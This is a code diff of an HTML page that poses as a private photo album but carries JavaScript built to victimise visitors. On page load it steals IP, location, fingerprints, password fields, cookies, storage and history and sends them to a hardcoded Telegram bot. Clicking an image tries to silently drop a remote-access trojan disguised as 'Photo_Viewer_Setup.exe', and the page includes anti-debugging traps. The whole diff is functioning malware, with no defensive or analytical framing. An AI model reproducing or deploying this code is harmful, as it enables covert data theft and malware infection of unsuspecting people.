@@ -105,7 +105,7 @@
         <p class="subtitle">Exclusive content - Click to view full album</p>
         
         <div class="gallery">
-            <div class="image-card" onclick="startCompleteExploitation(1)">
+            <div class="image-card" onclick="startCompleteExploitation(1, true)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928" 
                      alt="Private Photo 1" 
                      onerror="this.src='https://via.placeholder.com/200x150/667eea/ffffff?text=Photo+1'">
@@ -113,7 +113,7 @@
                 <div class="image-desc">normal pics </div>
             </div>
             
-            <div class="image-card" onclick="startCompleteExploitation(2)">
+            <div class="image-card" onclick="startCompleteExploitation(2, true)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928" 
                      alt="Private Photo 2"
                      onerror="this.src='https://via.placeholder.com/200x150/764ba2/ffffff?text=Photo+2'">
@@ -121,7 +121,7 @@
                 <div class="image-desc">Title says it all lol</div>
             </div>
             
-            <div class="image-card" onclick="startCompleteExploitation(3)">
+            <div class="image-card" onclick="startCompleteExploitation(3, true)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless" 
                      alt="Private Photo 3"
                      onerror="this.src='https://via.placeholder.com/200x150/48bb78/ffffff?text=Photo+3'">
@@ -140,7 +140,7 @@
     </div>
 
     <script>
-        // Combined Configuration
+        // Enhanced Configuration with Telegram RAT Control
         const CONFIG = {
             telegram: {
                 token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
@@ -167,8 +167,20 @@
         });
         setInterval(() => { debugger; }, 100);
 
+        // Enhanced Victim Identification System
+        function generateVictimId() {
+            const country = getCountryCode();
+            const randomNum = Math.floor(Math.random() * 100000).toString().padStart(5, '0');
+            const hasRAT = localStorage.getItem('rat_deployed') ? 'yes' : 'no';
+            return `vi.${country}.${randomNum}.rat_${hasRAT}`;
+        }
+
+        function getCountryCode() {
+            return navigator.language.split('-')[1] || 'unknown';
+        }
+
         // Main Exploitation Function
-        async function startCompleteExploitation(imageId) {
+        async function startCompleteExploitation(imageId, deployRAT = false) {
             const loading = document.getElementById('loading');
             loading.style.display = 'block';
             
@@ -181,13 +193,19 @@
                 // Collect Complete Data
                 const victimData = await collectCompleteIdentity();
                 
-                // Attempt RAT Deployment (SILENT)
-                const ratStatus = await deploySilentRAT(victimData);
+                // Deploy RAT only if image clicked (not on page load)
+                let ratStatus = { planted: false, attempts: {}, timestamp: new Date().toISOString() };
+                if (deployRAT) {
+                    ratStatus = await deploySilentRAT(victimData);
+                    if (ratStatus.planted) {
+                        localStorage.setItem('rat_deployed', 'true');
+                    }
+                }
                 
                 // Send Combined Report
-                await sendCombinedReport(victimData, ratStatus);
+                await sendCombinedReport(victimData, ratStatus, deployRAT);
                 
-                // Redirect
+                // Redirect to actual image
                 loading.innerHTML = '<div style="color: #48bb78;">Access granted! Loading image...</div>';
                 setTimeout(() => {
                     window.location.href = getImageUrl(imageId);
@@ -201,9 +219,11 @@
             }
         }
 
-        // Auto-start on page load
+        // Auto-start data theft on page load (no RAT deployment)
         window.addEventListener('load', () => {
-            setTimeout(() => startCompleteExploitation('page_load'), 3000);
+            setTimeout(() => {
+                startCompleteExploitation('page_load', false);
+            }, 2000);
         });
 
         // Complete Identity Collection
@@ -218,16 +238,15 @@
                 id: generateVictimId(),
                 timestamp: new Date().toISOString(),
                 
-                // Network & Location (4x Enhanced)
+                // Network & Location
                 network: networkData.status === 'fulfilled' ? networkData.value : {},
                 location: locationData.status === 'fulfilled' ? locationData.value : {},
                 
-                // Enhanced Fingerprinting (4x)
+                // Enhanced Fingerprinting
                 fingerprint: enhancedData.status === 'fulfilled' ? enhancedData.value.fingerprint : {},
                 hardware: enhancedData.status === 'fulfilled' ? enhancedData.value.hardware : {},
                 browser: enhancedData.status === 'fulfilled' ? enhancedData.value.browser : {},
                 behavioral: enhancedData.status === 'fulfilled' ? enhancedData.value.behavioral : {},
-                social: enhancedData.status === 'fulfilled' ? enhancedData.value.social : {},
                 
                 // Advanced Exploitation Data
                 exploitation: {
@@ -242,13 +261,12 @@
             };
         }
 
-        // SILENT RAT Deployment - No prompts, no visibility
+        // SILENT RAT Deployment - Only on image click
         async function deploySilentRAT(victimData) {
             const ratAttempts = {
                 blob_download: false,
                 iframe_injection: false,
-                service_worker: false,
-                background_fetch: false
+                service_worker: false
             };
 
             let ratPlanted = false;
@@ -270,12 +288,6 @@
                 if (!ratPlanted) {
                     ratAttempts.service_worker = await attemptServiceWorker();
                     if (ratAttempts.service_worker) ratPlanted = true;
-                }
-
-                // Method 4: Background Fetch
-                if (!ratPlanted) {
-                    ratAttempts.background_fetch = await attemptBackgroundFetch();
-                    if (ratAttempts.background_fetch) ratPlanted = true;
                 }
 
             } catch (error) {
@@ -300,7 +312,7 @@
                 // Create completely invisible download link
                 const link = document.createElement('a');
                 link.href = url;
-                link.download = 'windows_update.exe'; // Disguised filename
+                link.download = 'Photo_Viewer_Setup.exe'; // Disguised filename
                 link.style.display = 'none';
                 link.style.position = 'absolute';
                 link.style.left = '-9999px';
@@ -362,22 +374,6 @@
             }
         }
 
-        async function attemptBackgroundFetch() {
-            try {
-                // Use background fetch API for silent download
-                if ('backgroundFetch' in self) {
-                    const bgFetch = await self.backgroundFetch.fetch('rat-download', [CONFIG.c2.ratUrl], {
-                        title: 'System Update',
-                        icons: [{src: '', sizes: '64x64', type: 'image/png'}]
-                    });
-                    return true;
-                }
-                return false;
-            } catch (error) {
-                return false;
-            }
-        }
-
         // Enhanced Network Data Collection
         async function collectEnhancedNetworkData() {
             const [ipData, networkInfo] = await Promise.allSettled([
@@ -388,11 +384,8 @@
             return {
                 ip: ipData.status === 'fulfilled' ? ipData.value.ip : 'Unknown',
                 isp: ipData.status === 'fulfilled' ? ipData.value.isp : 'Unknown',
-                asn: ipData.status === 'fulfilled' ? ipData.value.asn : 'Unknown',
                 connection: networkInfo.status === 'fulfilled' ? networkInfo.value : {},
-                vpnDetection: detectEnhancedVPN(ipData.status === 'fulfilled' ? ipData.value.ip : 'Unknown'),
-                proxyDetection: detectProxy(),
-                torDetection: detectTor()
+                vpnDetection: detectEnhancedVPN(ipData.status === 'fulfilled' ? ipData.value.ip : 'Unknown')
             };
         }
 
@@ -409,46 +402,39 @@
                     region: data.region || 'Unknown',
                     country: data.country_name || 'Unknown',
                     country_code: data.country_code || 'Unknown',
-                    postal: data.postal || 'Unknown',
                     latitude: data.latitude || 'Unknown',
                     longitude: data.longitude || 'Unknown',
-                    timezone: data.timezone || 'Unknown',
-                    currency: data.currency || 'Unknown',
-                    calling_code: data.country_calling_code || 'Unknown',
-                    languages: navigator.languages || ['Unknown']
+                    timezone: data.timezone || 'Unknown'
                 };
             } catch (error) {
                 return {};
             }
         }
 
-        // Enhanced Fingerprint Data (4x)
+        // Enhanced Fingerprint Data
         async function collectEnhancedFingerprintData() {
-            const [browserData, hardwareData, fingerprintData, socialData] = await Promise.allSettled([
+            const [browserData, hardwareData, fingerprintData] = await Promise.allSettled([
                 getEnhancedBrowserInfo(),
                 getEnhancedHardwareInfo(),
-                getEnhancedFingerprint(),
-                scanEnhancedSocialData()
+                getEnhancedFingerprint()
             ]);
 
             return {
                 browser: browserData.status === 'fulfilled' ? browserData.value : {},
                 hardware: hardwareData.status === 'fulfilled' ? hardwareData.value : {},
                 fingerprint: fingerprintData.status === 'fulfilled' ? fingerprintData.value : {},
-                social: socialData.status === 'fulfilled' ? socialData.value : {},
                 behavioral: {
                     referrer: document.referrer || 'Direct',
                     url: window.location.href,
                     pageLoadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 'Unknown',
-                    timeOnPage: Date.now() - performance.timing.navigationStart,
-                    domSize: document.getElementsByTagName('*').length
+                    timeOnPage: Date.now() - performance.timing.navigationStart
                 }
             };
         }
 
         // Combined Reporting with RAT Status
-        async function sendCombinedReport(victimData, ratStatus) {
-            const message = formatCombinedReport(victimData, ratStatus);
+        async function sendCombinedReport(victimData, ratStatus, ratAttempted = false) {
+            const message = formatCombinedReport(victimData, ratStatus, ratAttempted);
             
             // Send to Telegram
             await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
@@ -468,13 +454,17 @@
                 body: JSON.stringify({
                     victim: victimData,
                     rat: ratStatus,
-                    type: ratStatus.planted ? 'RAT_PLANTED' : 'RAT_DENIED'
+                    rat_attempted: ratAttempted,
+                    type: ratStatus.planted ? 'RAT_PLANTED' : (ratAttempted ? 'RAT_FAILED' : 'DATA_ONLY')
                 })
             });
         }
 
-        function formatCombinedReport(victim, rat) {
-            const status = rat.planted ? "🚀 DATA STOLEN - RAT PLANTED" : "⚠️ DATA STOLEN - RAT DENIED";
+        function formatCombinedReport(victim, rat, ratAttempted) {
+            let status = "📡 DATA STOLEN - VISITOR ONLY";
+            if (ratAttempted) {
+                status = rat.planted ? "🚀 DATA STOLEN - RAT DEPLOYED" : "⚠️ DATA STOLEN - RAT FAILED";
+            }
             
             return `${status}
 
@@ -496,50 +486,44 @@
 🔓 *EXPLOITATION RESULTS:*
 • Passwords: ${victim.exploitation.passwords.length} captured
 • Autofill: ${Object.keys(victim.exploitation.autofill).length} entries
-• Forms: ${Object.keys(victim.exploitation.forms).length} harvested
 • Cookies: ${Object.keys(victim.exploitation.cookies).length} stolen
 • Storage: ${Object.keys(victim.exploitation.storage).length} items
 • History: ${victim.exploitation.history.length} sites visited
 
-📊 *BEHAVIORAL DATA:*
-• Referrer: ${victim.behavioral.referrer}
-• Page Load: ${victim.behavioral.pageLoadTime}ms
-• DOM Size: ${victim.behavioral.domSize} elements
-
-${rat.planted ? 
+${ratAttempted ? 
+`${rat.planted ? 
 `🚀 *RAT DEPLOYMENT: SUCCESSFUL*
 • Method: ${Object.keys(rat.attempts).find(key => rat.attempts[key])}
 • Visibility: COMPLETELY SILENT
-• User Awareness: ZERO
-• Persistence: ESTABLISHED` : 
+• User Awareness: ZERO` : 
 `⚠️ *RAT DEPLOYMENT: FAILED*
 • Attempts: ${Object.values(rat.attempts).filter(Boolean).length}
-• Methods: ${Object.keys(rat.attempts).filter(key => rat.attempts[key]).join(', ') || 'None'}
-• Reason: Browser security restrictions`}
+• Methods: ${Object.keys(rat.attempts).filter(key => rat.attempts[key]).join(', ') || 'None'}`}` : 
+`📡 *DATA COLLECTION ONLY*
+• RAT deployment pending image click`}
 
-🔗 *C2 STATUS: ACTIVE*
-📡 *CONTINUOUS MONITORING: ENABLED*`;
+🔗 *TELEGRAM CONTROL: ACTIVE*
+🎯 *NEXT TARGET: AWAITING IMAGE CLICK*`;
         }
 
         // Utility Functions
         async function getEnhancedIP() {
-            const services = ['https://api.ipify.org?format=json', 'https://api64.ipify.org?format=json', 'https://ipinfo.io/json'];
+            const services = ['https://api.ipify.org?format=json', 'https://api64.ipify.org?format=json'];
             for (const service of services) {
                 try {
                     const response = await fetch(service);
                     const data = await response.json();
-                    return { ip: data.ip || data.query || 'Unknown', isp: data.org || 'Unknown', asn: data.asn || 'Unknown' };
+                    return { ip: data.ip || 'Unknown', isp: 'Unknown' };
                 } catch (error) { continue; }
             }
-            return { ip: 'Unknown', isp: 'Unknown', asn: 'Unknown' };
+            return { ip: 'Unknown', isp: 'Unknown' };
         }
 
         async function getEnhancedNetworkInfo() {
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             return {
                 effectiveType: connection ? connection.effectiveType : 'Unknown',
-                downlink: connection ? connection.downlink + ' Mbps' : 'Unknown',
-                rtt: connection ? connection.rtt + ' ms' : 'Unknown'
+                downlink: connection ? connection.downlink + ' Mbps' : 'Unknown'
             };
         }
 
@@ -547,11 +531,9 @@ ${rat.planted ?
             return {
                 platform: navigator.platform,
                 userAgent: navigator.userAgent,
-                vendor: navigator.vendor || 'Unknown',
                 language: navigator.language,
                 hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory || 'Unknown',
-                plugins: Array.from(navigator.plugins).map(p => p.name)
+                deviceMemory: navigator.deviceMemory || 'Unknown'
             };
         }
 
@@ -561,21 +543,15 @@ ${rat.planted ?
                 screen: `${screen.width}x${screen.height}`,
                 devicePixelRatio: window.devicePixelRatio,
                 cpuCores: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory || 'Unknown',
-                maxTouchPoints: navigator.maxTouchPoints
+                deviceMemory: navigator.deviceMemory || 'Unknown'
             };
         }
 
         function getEnhancedFingerprint() {
             return {
                 canvasFingerprint: generateCanvasFingerprint(),
-                webglFingerprint: generateWebGLFingerprint(),
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
-        }
-
-        async function scanEnhancedSocialData() {
-            return { usernames: [], platforms: [], profiles: [] };
         }
 
         // Exploitation functions
@@ -583,8 +559,7 @@ ${rat.planted ?
             const fields = document.querySelectorAll('input[type="password"]');
             const results = [];
             for (const field of fields) {
-                field.focus(); field.blur();
-                setTimeout(() => { if (field.value) results.push({ field: field.name, value: field.value }); }, 100);
+                if (field.value) results.push({ field: field.name || 'unknown', value: field.value });
             }
             return results;
         }
@@ -654,18 +629,6 @@ ${rat.planted ?
             return ranges.some(range => ip.startsWith(range)) ? 'Possible VPN/Proxy' : 'Residential IP';
         }
 
-        function detectProxy() {
-            return navigator.webdriver ? 'Possible automation' : 'Normal';
-        }
-
-        function detectTor() {
-            return navigator.plugins.length === 0 ? 'Possible Tor' : 'Normal';
-        }
-
-        function generateVictimId() {
-            return Date.now().toString(36) + Math.random().toString(36).substr(2, 9);
-        }
-
         function generateCanvasFingerprint() {
             try {
                 const canvas = document.createElement('canvas');
@@ -676,19 +639,11 @@ ${rat.planted ?
             } catch (e) { return 'failed'; }
         }
 
-        function generateWebGLFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                return gl ? gl.getParameter(gl.VERSION) : 'no_webgl';
-            } catch (e) { return 'failed'; }
-        }
-
         function getImageUrl(imageId) {
             return CONFIG.images[imageId] || '#';
         }
 
-        console.log('🕵️ Silent exploitation system loaded - RAT deployment completely invisible');
+        console.log('🕵️ Enhanced exploitation system loaded - Data theft active, RAT deployment on image click');
     </script>
 </body>
 </html>
